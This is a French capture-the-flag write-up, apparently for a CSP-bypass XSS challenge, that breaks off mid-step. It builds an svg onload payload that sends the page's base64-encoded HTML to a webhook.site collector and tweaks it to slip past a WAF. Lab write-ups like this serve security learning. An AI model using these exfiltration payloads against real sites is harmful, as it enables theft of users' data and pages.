
![](../img/Pasted%20image%2020260814235635.png)


Dans ce challenge nous pouvons voir qu'il faudra exfiltrez le contenu d'une page. 

Nous allons tout d'abord voir ce qu'il y a sur le site et comment il se présente.


Page principale : 

![](../img/Pasted%20image%2020260815001110.png)

Voyons voir ce qu'il se passe lorsqu'on rentre dans le input une valeur de teste par exemple "test".

![](../img/Pasted%20image%2020260815001158.png)

Nous pouvons voir actuellement que dans l'URL du site il y a un paramètre de requête nommer user qui à pour valeur l'input qu'on viens de mettre. 

Image explicatif : 

![](../img/Pasted%20image%2020260815001358.png)


Dans ce cas ci nous allons voir si nous pouvons Bypass les CSP restrictions. Car oui même si pour l'instant nous avons pas fais de test (je vais vous montrer comme quoi il y a bien la restriction) au nom du challenge nous pouvons déjà savoir que le challenge va se basé sur le contournement de sécurité du CSP (Content Security Policy). 

Bon maintenant tentons une XSS basique comme par exemple : 

```html
<script>alert("test")</script>
```

![](../img/Pasted%20image%2020260815001654.png)

Nous pouvons voir dans l'url en paramètre que j'ai tenter l'XSS basique qui est celui que je vous ai montrer juste au dessus.

Maintenant comment bypass ? 

En réalité une XSS ne se base pas que sur la balise script. Il y d'autre XSS qui sont possible, comme par exemple avec les balises svg et img qui vont nous permettre d'exécuté du code javascript dans le navigateur directement. Grâce à des attributs de gestionnaire d'événements, pourquoi ce nom ? Car nous allons gérer l'action qui se passe lorsque l'événement est utilisé. C'est assez brouillon dis comme cela mais laisser moi vous montrez : 

```html
<svg onload="alert('test')">
```

Ici nous avons un autre payload pour voir s'il y a bel est bien une XSS qui sont possible.
Ici ce payload permet de faire charger une image SVG(Scalable Vector Graphics) c'est un type d'image qui est générer grâce à un code XML. Bon cette image à un attributs d'événement qui s'appelle onload. Onload veut dire que lorsque l'image sera charger alors on fais une action. C'est pour cela le ="". Attention lorsque vous allez mettre du code dans le ="" vous ne pouvez plus utiliser le caractère "" pour votre payload. Car javascript n'aime pas et va fermer le payload avant que vous le vouliez. 

Bon maintenant vous avez deveniez on exécute alert("test") qui va nous afficher un message à l'écran(si le XSS passe).

Passons au test du payload : 

![](../img/Pasted%20image%2020260815002652.png)

Bingo nous pouvons voir que notre payload à bel est bien étais interprêter côté Serveur. Bon maintenant que nous savons qu'il y a une XSS nous pouvons passer à la suite. Car oui nous avons beau avoir trouver une faille XSS elle se passe que sur notre client. Or nous n'avons pas le contenu de la page avec le Flag il va falloir qu'on trouve un moyen que le bot ou qu'un administrateur / compte admin exécute notre payload ou au moins charge la page. 

Attendez mais on est pas aller voir le bouton "Fill in forum"

![](../img/Pasted%20image%2020260815002907.png)

Voyons voir la page qui nous redirige. 

![](../img/Pasted%20image%2020260815002953.png)

Okay nous avons une page pour signaler une page qui est vulnérable à une faille de sécurité. Ce qui veut dire qu'un admin va passer par notre lien malveillant. Bingo ! Maintenant nous allons complexifier notre payload.

Première tentative de payload : 
```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
```
Bon au niveau du svg nous gardons la même logique. Maintenant laisser moi vous expliquez la suite du payload. 

```html
document.location.href= 
```

Va nous permettre dans notre cas de dire "lorsque tu as analyser et afficher avec succès l'image tu vas quitter la page et aller naviger vers le nouveau URL : ".
Dans notre cas document.location.href va pointer sur l'url de webhook url qui va nous permettre de récupérer les données de la query que nous allons initialisé.

L'url de mon webhook.site : 
https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa
Dans votre cas c'est quelque chose comme : 
https://webhook.site/[Votre_ID]

Maintenant pourquoi on met ?c= comme je vous l'ai expliquer c'est un paramètre et nous pouvons initialiser une variable et lui donner une valeur. Dans notre cas dans notre query(requête) nous allons initialiser une variable (grâce à ?) qui va être nommée c (j'ai nommée comme ça pour dire cookie et pour raccourcir le payload) et = permet de donnée la valeur.

Maintenant on quitte le document.location.href pour concaténer (collé) les données que l'on souhaite récupérer. 

Ici pour éviter le de me faire filtre par le site (WAF ou autre) je vais utiliser .concat pour concaténer qui est beaucoup moins filtrer comparer à "+" car oui + aussi permet de concatener mais ici on essaye de faire un payload le plus simple et efficace. 

Bon donc après le .concat permet juste de collé à ?c= ce qui va donner : 
?c=[les données qu'on va récupérer dans le concat]

Bon maintenant pourquoi le encodeURIComponent ? 

En réalité, lorsque vous êtes habituer vous verrez que l'option d'encodage en base 64 btoa(encodage) et atob (pour décoder) si vous récupérer directement les caractère + seront remplacer par " " ce qui donne donc un code en base64 qui n'est pas facile à décoder. Il faudrait parse (lire la donnée) et séparer avec un .replace ou autre pour remplacer les caractère. Or ici encodeURIComponent va permettre de mettre tous les signes comme +, " ", "/" etc... en code URL Encode. Ce qui donne par exemple pour le + => %2B etc... et donc par la suite btoa va pouvoir bien encoder les données en base64.

Bon maintenant nous savons que l'ont veut récupérer les données qui se situe actuellement sur la page web car c'est ce qui nous ai dis avec : 

![](../../Pasted%20image%2020260815004634.png)

{FLAG_REDACTED} qui est actuellement dans la page.

c'est pour cela qu'on met : 
```html
document.body.innerHTML
```

Qui récupéreras les données dans le body de la page (le code HTML) et grâce au btoa cela va encoder la page en base64. 

Bon récapitulatif du payload : 

```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
```
	

![](../img/Pasted%20image%2020260815010857.png)

Bon je vais pas vous mentir actuellement vous pourrez attendre longtemps rien n'arriveras car il y a un WAF qui rejette discrètement notre payload. On va donc laisser le navigateur de la victime (bot ou admin) remplacer notre lien pour ce faire on va juste enlever https: devant notre lien ce qui donne le payload :  

```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
```

Maintenant essayons de voir si on reçoit quelques choses : 

![](../img/Pasted%20image%2020260815012556.png)


Voici le code en base64 de la page qu'on viens de récupérer : 

Maintenant nous allons le décoder directement dans la console web grâce à atob qui est la fonction de décodage de btoa. 

Voici comment on fait : 